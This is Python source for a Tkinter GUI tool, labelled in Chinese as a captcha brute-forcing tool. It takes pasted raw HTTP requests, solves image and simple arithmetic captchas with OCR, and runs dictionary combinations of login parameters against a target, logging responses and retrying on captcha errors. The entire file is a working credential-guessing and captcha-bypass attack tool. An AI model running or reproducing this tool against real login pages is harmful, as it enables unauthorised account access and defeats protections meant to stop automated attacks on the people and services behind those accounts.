import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import requests
import threading
import ddddocr
import base64
import io
from PIL import Image, ImageTk
import re
import itertools
from datetime import datetime
import json
import os
import queue

# Helper to parse raw HTTP request
class RequestParser:
    @staticmethod
    def parse(raw_request):
        try:
            lines = raw_request.strip().splitlines()
            if not lines:
                return None, None, None, None

            # Parse Request Line
            request_line = lines[0].split()
            if len(request_line) < 2:
                return None, None, None, None
            
            method = request_line[0]
            url = request_line[1]
            
            headers = {}
            body = ""
            
            # Separate headers and body
            header_lines = []
            body_start_idx = -1
            
            for i, line in enumerate(lines[1:], 1):
                if line == "":
                    body_start_idx = i + 1
                    break
                header_lines.append(line)
            
            # Parse Headers
            for line in header_lines:
                if ":" in line:
                    key, value = line.split(":", 1)
                    headers[key.strip()] = value.strip()
            
            # Parse Body
            if body_start_idx != -1 and body_start_idx < len(lines):
                body = "\n".join(lines[body_start_idx:])
            
            # Handle URL (if relative, try to find Host header)
            if not url.startswith("http"):
                host = headers.get("Host", "")
                if host:
                    protocol = "http" # Default to http, hard to guess https from raw text unless port 443
                    url = f"{protocol}://{host}{url}"
            
            return method, url, headers, body
        except Exception as e:
            print(f"Parse error: {e}")
            return None, None, None, None

class MainApp:
    def __init__(self, root):
        self.root = root
        self.root.title("验证码爆破工具 GUI (by: Testin007)")
        self.root.geometry("1200x900")
        
        self.ocr = ddddocr.DdddOcr(show_ad=False)
        self.log_queue = queue.Queue()
        
        # Data Stores
        self.captcha_config = {}
        self.login_config = {}
        self.param_vars = {} # Stores configuration for each parameter
        self.running = False
        
        self.setup_ui()
        self.root.after(100, self.process_log_queue)

    def setup_ui(self):
        # Notebook for Tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Tab 1: Captcha Configuration
        self.tab_captcha = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_captcha, text="1. 验证码配置")
        self.setup_captcha_tab()
        
        # Tab 2: Attack Configuration
        self.tab_attack = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_attack, text="2. 攻击配置")
        self.setup_attack_tab()
        
        # Tab 3: Execution & Results
        self.tab_run = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_run, text="3. 运行与结果")
        self.setup_run_tab()

    def setup_captcha_tab(self):
        paned = ttk.PanedWindow(self.tab_captcha, orient=tk.VERTICAL)
        paned.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Top: Request Input
        frame_req = ttk.LabelFrame(paned, text="在此粘贴验证码请求包")
        paned.add(frame_req, weight=1)
        
        self.txt_captcha_req = scrolledtext.ScrolledText(frame_req, height=10)
        self.txt_captcha_req.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        btn_frame = ttk.Frame(frame_req)
        btn_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(btn_frame, text="测试获取并识别", command=self.test_captcha).pack(side=tk.LEFT)
        
        # Bottom: Response & Preview
        frame_resp = ttk.LabelFrame(paned, text="响应与预览")
        paned.add(frame_resp, weight=1)
        
        # Split Bottom into Text and Image
        frame_resp_inner = ttk.Frame(frame_resp)
        frame_resp_inner.pack(fill=tk.BOTH, expand=True)
        
        self.txt_captcha_resp = scrolledtext.ScrolledText(frame_resp_inner, height=10, width=80)
        self.txt_captcha_resp.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        frame_preview = ttk.Frame(frame_resp_inner, width=300)
        frame_preview.pack(side=tk.RIGHT, fill=tk.Y, padx=5, pady=5)
        
        ttk.Label(frame_preview, text="验证码图片:").pack(pady=5)
        self.lbl_image = ttk.Label(frame_preview, text="[无图片]")
        self.lbl_image.pack(pady=5)
        
        ttk.Label(frame_preview, text="OCR 识别结果:").pack(pady=5)
        self.lbl_ocr_result = ttk.Label(frame_preview, text="---", font=("Arial", 14, "bold"))
        self.lbl_ocr_result.pack(pady=5)
        
        # Checkbox for Math Mode
        self.var_math_mode = tk.BooleanVar(value=False)
        self.chk_math_mode = ttk.Checkbutton(frame_preview, text="启用算术模式 (X op Y)", variable=self.var_math_mode)
        self.chk_math_mode.pack(pady=5)

    def setup_attack_tab(self):
        paned = ttk.PanedWindow(self.tab_attack, orient=tk.HORIZONTAL)
        paned.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Left: Login Request Input
        frame_left = ttk.LabelFrame(paned, text="在此粘贴登录/攻击请求包")
        paned.add(frame_left, weight=1)
        
        self.txt_login_req = scrolledtext.ScrolledText(frame_left)
        self.txt_login_req.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        ttk.Button(frame_left, text="解析参数", command=self.parse_login_params).pack(fill=tk.X, padx=5, pady=5)
        
        # Right: Parameter Config
        frame_right = ttk.LabelFrame(paned, text="参数配置")
        paned.add(frame_right, weight=1)
        
        self.frame_params = ttk.Frame(frame_right)
        self.frame_params.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Retry Config Area
        frame_retry = ttk.LabelFrame(frame_right, text="重试配置")
        frame_retry.pack(fill=tk.X, padx=5, pady=5, side=tk.BOTTOM)
        
        ttk.Label(frame_retry, text="重试关键字 (响应中包含):").grid(row=0, column=0, padx=5, pady=5)
        self.entry_retry_key = ttk.Entry(frame_retry)
        self.entry_retry_key.insert(0, "验证码错误")
        self.entry_retry_key.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        
        ttk.Label(frame_retry, text="最大重试次数:").grid(row=1, column=0, padx=5, pady=5)
        self.entry_max_retries = ttk.Entry(frame_retry)
        self.entry_max_retries.insert(0, "5")
        self.entry_max_retries.grid(row=1, column=1, padx=5, pady=5, sticky="ew")

    def setup_run_tab(self):
        paned = ttk.PanedWindow(self.tab_run, orient=tk.VERTICAL)
        paned.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Top: Controls & Table
        frame_top = ttk.Frame(paned)
        paned.add(frame_top, weight=2)
        
        btn_frame = ttk.Frame(frame_top)
        btn_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.btn_start = ttk.Button(btn_frame, text="开始攻击", command=self.start_attack)
        self.btn_start.pack(side=tk.LEFT, padx=5)
        
        self.btn_stop = ttk.Button(btn_frame, text="停止", command=self.stop_attack, state=tk.DISABLED)
        self.btn_stop.pack(side=tk.LEFT, padx=5)
        
        self.lbl_status = ttk.Label(btn_frame, text="就绪")
        self.lbl_status.pack(side=tk.RIGHT, padx=5)
        
        # Treeview
        columns = ("timestamp", "payload", "captcha", "status", "length", "result", "retries")
        self.tree = ttk.Treeview(frame_top, columns=columns, show="headings")
        self.tree.heading("timestamp", text="时间")
        self.tree.heading("payload", text="Payload")
        self.tree.heading("captcha", text="验证码")
        self.tree.heading("status", text="状态码")
        self.tree.heading("length", text="长度")
        self.tree.heading("result", text="结果")
        self.tree.heading("retries", text="重试次数")
        
        self.tree.column("timestamp", width=120)
        self.tree.column("payload", width=200)
        self.tree.column("captcha", width=60)
        self.tree.column("status", width=50)
        self.tree.column("length", width=60)
        self.tree.column("result", width=80)
        self.tree.column("retries", width=50)
        
        self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.tree.bind("<<TreeviewSelect>>", self.on_tree_select)
        
        # Bottom: Details
        frame_bottom = ttk.LabelFrame(paned, text="请求/响应 详情")
        paned.add(frame_bottom, weight=1)
        
        # Tabs for details
        detail_notebook = ttk.Notebook(frame_bottom)
        detail_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.txt_detail_req = scrolledtext.ScrolledText(detail_notebook, height=10)
        detail_notebook.add(self.txt_detail_req, text="请求")
        
        self.txt_detail_resp = scrolledtext.ScrolledText(detail_notebook, height=10)
        detail_notebook.add(self.txt_detail_resp, text="响应")

    # --- Logic ---

    def test_captcha(self):
        raw_req = self.txt_captcha_req.get("1.0", tk.END).strip()
        if not raw_req:
            messagebox.showerror("错误", "请先粘贴验证码请求包。")
            return
            
        method, url, headers, body = RequestParser.parse(raw_req)
        if not url:
            messagebox.showerror("错误", "请求解析失败。")
            return
            
        self.captcha_config = {
            "method": method,
            "url": url,
            "headers": headers,
            "body": body
        }
        
        threading.Thread(target=self._run_captcha_test, daemon=True).start()

    def _run_captcha_test(self):
        try:
            session = requests.Session()
            # Clear proxies to avoid issues
            session.proxies = {}
            
            resp = session.request(
                method=self.captcha_config["method"],
                url=self.captcha_config["url"],
                headers=self.captcha_config["headers"],
                data=self.captcha_config["body"],
                timeout=10
            )
            
            # Update GUI with response text
            self.root.after(0, lambda: self.txt_captcha_resp.delete("1.0", tk.END))
            self.root.after(0, lambda: self.txt_captcha_resp.insert(tk.END, f"Status: {resp.status_code}\nHeaders: {resp.headers}\n\nBody:\n{resp.text[:1000]}... (truncated)"))
            
            # Extract Image
            img_bytes = self.extract_captcha_image(resp)
            
            if img_bytes:
                # OCR
                raw_code = self.ocr.classification(img_bytes)
                
                # Check for arithmetic
                final_code = self.evaluate_math_captcha(raw_code)
                
                # Update Image and Label
                self.root.after(0, lambda: self._update_captcha_preview(img_bytes, f"{raw_code} -> {final_code}" if raw_code != final_code else final_code))
            else:
                self.root.after(0, lambda: messagebox.showwarning("警告", "无法从响应中提取图片。"))
                
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("错误", str(e)))

    def extract_captcha_image(self, resp):
        # 1. Check Content-Type for raw image
        content_type = resp.headers.get("Content-Type", "").lower()
        if "image" in content_type:
            return resp.content
            
        # 2. Try to parse as JSON first (cleanest way to handle escapes)
        try:
            data = resp.json()
            # Recursively search for base64 string in JSON
            def find_b64(obj):
                if isinstance(obj, str):
                    # 1. Check for standard data URI scheme
                    if "data:image" in obj and "base64," in obj:
                        return obj.split("base64,")[1]
                    
                    # 2. Check for raw base64 string (heuristic)
                    # Common image headers:
                    # JPEG: /9j/
                    # PNG: iVBORw0KGgo
                    # GIF: R0lGODlh
                    if len(obj) > 100:
                         # Quick prefix check for common image types
                         if obj.startswith("/9j/") or obj.startswith("iVBORw0KGgo") or obj.startswith("R0lGODlh"):
                             return obj
                         # Try decoding to check magic bytes if not obvious
                         try:
                             # Only try if it looks like base64 (no spaces, valid chars)
                             if re.match(r'^[a-zA-Z0-9+/=]+$', obj):
                                 decoded = base64.b64decode(obj)
                                 if decoded.startswith(b'\xff\xd8\xff') or \
                                    decoded.startswith(b'\x89PNG') or \
                                    decoded.startswith(b'GIF8'):
                                     return obj
                         except:
                             pass
                             
                elif isinstance(obj, dict):
                    # Prioritize keys that sound like images
                    for k in ["img", "image", "base64", "captcha"]:
                        if k in obj:
                             res = find_b64(obj[k])
                             if res: return res
                             
                    for v in obj.values():
                        res = find_b64(v)
                        if res: return res
                elif isinstance(obj, list):
                    for v in obj:
                        res = find_b64(v)
                        if res: return res
                return None
            
            b64_str = find_b64(data)
            if b64_str:
                return base64.b64decode(b64_str)
        except:
            pass

        # 3. Fallback to Regex on raw text
        text = resp.text
        # Regex to find base64 image: data:image/\w+;base64,([^"']+)
        # Updated regex to handle optional escaped backslash before forward slash (json raw format)
        # matches data:image/png... and data:image\/png...
        match = re.search(r'data:image(?:\\?\/)\w+;base64,([a-zA-Z0-9+/=]+)', text)
        if match:
            b64_str = match.group(1)
            try:
                return base64.b64decode(b64_str)
            except:
                pass
                
        return None

    def evaluate_math_captcha(self, text):
        """
        Evaluate single digit math captcha: X op Y
        Only takes first 3 chars if math mode is enabled.
        """
        if not text:
            return text
            
        try:
            # Only process if math mode is enabled
            if not self.var_math_mode.get():
                return text
                
            # Strictly take first 3 chars as requested
            if len(text) < 3:
                return text
                
            math_part = text[:3]
            
            # Extract chars
            c1 = math_part[0]
            op = math_part[1]
            c2 = math_part[2]
            
            # Check if valid math structure
            if not (c1.isdigit() and c2.isdigit()):
                return text
                
            num1 = int(c1)
            num2 = int(c2)
            
            res = 0
            if op == '+':
                res = num1 + num2
            elif op == '-':
                res = num1 - num2
            elif op == '*' or op == 'x' or op == 'X':
                res = num1 * num2
            elif op == '/':
                if num2 == 0: return text
                res = num1 // num2
            else:
                # Invalid operator
                return text
                
            return str(res)
                
        except Exception as e:
            print(f"Math eval error: {e}")
            pass
            
        return text

    def _update_captcha_preview(self, img_bytes, code):
        try:
            image = Image.open(io.BytesIO(img_bytes))
            # Resize for display if too small or large
            image.thumbnail((200, 100))
            photo = ImageTk.PhotoImage(image)
            
            self.lbl_image.configure(image=photo)
            self.lbl_image.image = photo # Keep reference
            self.lbl_ocr_result.configure(text=code)
        except Exception as e:
            print(f"Preview error: {e}")

    def parse_login_params(self):
        raw_req = self.txt_login_req.get("1.0", tk.END).strip()
        if not raw_req:
            return
            
        method, url, headers, body = RequestParser.parse(raw_req)
        if not url:
            messagebox.showerror("错误", "请求解析失败。")
            return
            
        self.login_config = {
            "method": method,
            "url": url,
            "headers": headers,
            "raw_body": body
        }
        
        # Clear existing params
        for widget in self.frame_params.winfo_children():
            widget.destroy()
        self.param_vars = {}
        
        # Parse Body Parameters (assuming urlencoded)
        if body:
            params = {}
            try:
                # Basic parsing: key=value&key2=value2
                pairs = body.split('&')
                for pair in pairs:
                    if '=' in pair:
                        k, v = pair.split('=', 1)
                        params[k] = v
                    else:
                        params[pair] = ""
            except:
                pass
            
            # Create UI for each param
            for i, (key, val) in enumerate(params.items()):
                self._create_param_row(i, key, val)

    def _create_param_row(self, row, key, val):
        lbl = ttk.Label(self.frame_params, text=f"{key}:")
        lbl.grid(row=row, column=0, padx=5, pady=5, sticky="e")
        
        # Mode Selection
        mode_var = tk.StringVar(value="Fixed")
        type_combo = ttk.Combobox(self.frame_params, textvariable=mode_var, values=["Fixed", "Dictionary", "Captcha"], state="readonly", width=10)
        type_combo.grid(row=row, column=1, padx=5, pady=5)
        
        # Value/Path Input
        val_entry = ttk.Entry(self.frame_params, width=30)
        val_entry.insert(0, val)
        val_entry.grid(row=row, column=2, padx=5, pady=5)
        
        # Browse Button (only for dictionary, technically visible always but useful only for dict)
        btn_browse = ttk.Button(self.frame_params, text="...", width=3, command=lambda: self._browse_file(val_entry))
        btn_browse.grid(row=row, column=3, padx=5, pady=5)
        
        def on_mode_change(event):
            if mode_var.get() == "Captcha":
                val_entry.config(state='disabled')
            else:
                val_entry.config(state='normal')
        type_combo.bind("<<ComboboxSelected>>", on_mode_change)

        self.param_vars[key] = {
            "mode": mode_var,
            "value_widget": val_entry,
            "original": val
        }

    def _browse_file(self, entry_widget):
        filename = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if filename:
            entry_widget.delete(0, tk.END)
            entry_widget.insert(0, filename)

    def start_attack(self):
        if self.running:
            return
            
        # Validate Configs
        if not self.captcha_config:
            messagebox.showerror("错误", "未配置验证码。")
            return
        if not self.login_config:
            messagebox.showerror("错误", "未解析登录请求。")
            return
            
        # Prepare Data
        iterables = {}
        fixed_params = {}
        captcha_param_key = None
        
        try:
            for key, config in self.param_vars.items():
                mode = config["mode"].get()
                val = config["value_widget"].get()
                
                if mode == "Fixed":
                    fixed_params[key] = val
                elif mode == "Captcha":
                    captcha_param_key = key
                elif mode == "Dictionary":
                    if not os.path.exists(val):
                        raise Exception(f"文件未找到: {val}")
                    
                    # Try reading with different encodings
                    items = []
                    read_success = False
                    for enc in ['utf-8', 'gbk', 'gb18030', 'latin-1']:
                        try:
                            with open(val, 'r', encoding=enc) as f:
                                items = [line.strip() for line in f if line.strip()]
                            read_success = True
                            break
                        except UnicodeDecodeError:
                            continue
                    
                    if not read_success:
                         raise Exception(f"无法使用 utf-8 或 gbk 编码读取文件 {val}。")
                         
                    iterables[key] = items
        except Exception as e:
            messagebox.showerror("错误", str(e))
            return

        if not iterables and not captcha_param_key:
             messagebox.showerror("错误", "未选择变化的参数（字典或验证码）。")
             return
             
        # Generate Combinations
        keys = list(iterables.keys())
        values_list = [iterables[k] for k in keys]
        combinations = list(itertools.product(*values_list))
        
        if not combinations:
             # Case where only captcha changes but everything else is fixed (weird but possible)
             combinations = [()]
        
        self.running = True
        self.btn_start.config(state=tk.DISABLED)
        self.btn_stop.config(state=tk.NORMAL)
        self.lbl_status.config(text=f"运行中... {len(combinations)} 组组合")
        
        # Clear Table
        for item in self.tree.get_children():
            self.tree.delete(item)
            
        # Start Thread
        threading.Thread(target=self._attack_worker, args=(keys, combinations, fixed_params, captcha_param_key), daemon=True).start()

    def stop_attack(self):
        self.running = False
        self.lbl_status.config(text="停止中...")

    def _attack_worker(self, keys, combinations, fixed_params, captcha_param_key):
        retry_key = self.entry_retry_key.get()
        try:
            max_retries = int(self.entry_max_retries.get())
        except:
            max_retries = 3
            
        # Prepare Headers (Strip Cookies/Content-Length to let Session/Requests handle them)
        def clean_headers(headers):
            new_headers = headers.copy()
            keys_to_remove = ["Cookie", "Content-Length", "Host"] 
            for k in keys_to_remove:
                # Case insensitive check might be better but for now direct check
                if k in new_headers: del new_headers[k]
            return new_headers

        captcha_headers = clean_headers(self.captcha_config["headers"]) if self.captcha_config else {}
        login_headers = clean_headers(self.login_config["headers"])
            
        for combo in combinations:
            if not self.running:
                break
                
            # Current params from dictionaries
            current_dict_params = dict(zip(keys, combo))
            
            # Merge params
            params_to_send = {**fixed_params, **current_dict_params}
            
            # Login Attempt with Retry Logic
            final_result = None
            final_attempt_count = 0
            
            for attempt in range(max_retries):
                final_attempt_count = attempt + 1
                if not self.running:
                    break
                    
                session = requests.Session()
                session.proxies = {} # No proxy
                
                # 1. Fetch Captcha
                try:
                    cap_resp = session.request(
                        method=self.captcha_config["method"],
                        url=self.captcha_config["url"],
                        headers=captcha_headers,
                        data=self.captcha_config["body"],
                        timeout=10
                    )
                    img_bytes = self.extract_captcha_image(cap_resp)
                    if img_bytes:
                        raw_code = self.ocr.classification(img_bytes)
                        captcha_code = self.evaluate_math_captcha(raw_code)
                    else:
                        captcha_code = "ERROR"
                except:
                    captcha_code = "FAIL"
                
                if not captcha_code:
                    captcha_code = "0000"
                    
                # Add captcha to params
                if captcha_param_key:
                    params_to_send[captcha_param_key] = captcha_code
                    
                # Reconstruct Body (Form-UrlEncoded)
                try:
                    login_resp = session.request(
                        method=self.login_config["method"],
                        url=self.login_config["url"],
                        headers=login_headers,
                        data=params_to_send, # requests handles urlencoding
                        allow_redirects=False,
                        timeout=10
                    )
                    
                    login_resp.encoding = 'utf-8'
                    
                    # Check Retry
                    if retry_key and retry_key in login_resp.text:
                         # Retry needed
                         if attempt == max_retries - 1:
                             final_result = (login_resp, "Max Retries")
                         continue
                    
                    # Success/Fail check
                    result_txt = "OK"
                    if login_resp.status_code == 302:
                        result_txt = "Redirect"
                    elif "login failed" in login_resp.text.lower():
                        result_txt = "Failed"
                    
                    final_result = (login_resp, result_txt)
                    break # Success loop exit
                    
                except Exception as e:
                    final_result = (None, str(e))
            
            # Log Result
            payload_str = ", ".join([f"{k}={v}" for k,v in current_dict_params.items()])
            
            if final_result:
                resp, res_text = final_result
                if resp:
                    self.log_queue.put({
                        "timestamp": datetime.now().strftime("%H:%M:%S"),
                        "payload": payload_str,
                        "captcha": params_to_send.get(captcha_param_key, "N/A"),
                        "status": resp.status_code,
                        "length": len(resp.text),
                        "result": res_text,
                        "retries": final_attempt_count,
                        "req_detail": self._format_req_detail(resp),
                        "resp_detail": self._format_resp_detail(resp)
                    })
                else:
                    self.log_queue.put({
                        "timestamp": datetime.now().strftime("%H:%M:%S"),
                        "payload": payload_str,
                        "captcha": "ERR",
                        "status": "ERR",
                        "length": 0,
                        "result": res_text, # Error msg
                        "retries": final_attempt_count,
                        "req_detail": "",
                        "resp_detail": ""
                    })

        self.running = False
        self.root.after(0, self._finish_attack)

    def _format_req_detail(self, resp):
        headers = "\n".join([f"{k}: {v}" for k,v in resp.request.headers.items()])
        body = resp.request.body if resp.request.body else ""
        return f"{resp.request.method} {resp.request.url}\n{headers}\n\n{body}"

    def _format_resp_detail(self, resp):
        headers = "\n".join([f"{k}: {v}" for k,v in resp.headers.items()])
        return f"Status: {resp.status_code}\n{headers}\n\n{resp.text}"

    def process_log_queue(self):
        while not self.log_queue.empty():
            item = self.log_queue.get()
            item_id = self.tree.insert("", tk.END, values=(
                item["timestamp"],
                item["payload"],
                item["captcha"],
                item["status"],
                item["length"],
                item["result"],
                item.get("retries", 0)
            ))
            # Store details in the item tags or a separate dict mapping
            if not hasattr(self, 'detail_map'):
                self.detail_map = {}
            self.detail_map[item_id] = (item["req_detail"], item["resp_detail"])
            
            # Auto scroll
            self.tree.yview_moveto(1)
            
        self.root.after(100, self.process_log_queue)

    def on_tree_select(self, event):
        selected_items = self.tree.selection()
        if selected_items:
            item_id = selected_items[0]
            if hasattr(self, 'detail_map') and item_id in self.detail_map:
                req, resp = self.detail_map[item_id]
                self.txt_detail_req.delete("1.0", tk.END)
                self.txt_detail_req.insert(tk.END, req)
                self.txt_detail_resp.delete("1.0", tk.END)
                self.txt_detail_resp.insert(tk.END, resp)

    def _finish_attack(self):
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)
        self.lbl_status.config(text="完成")
        messagebox.showinfo("提示", "攻击已完成")

if __name__ == "__main__":
    # Environment Fix for Proxy Issues
    os.environ["HTTP_PROXY"] = ""
    os.environ["HTTPS_PROXY"] = ""
    os.environ["ALL_PROXY"] = ""
    
    root = tk.Tk()
    app = MainApp(root)
    root.mainloop()
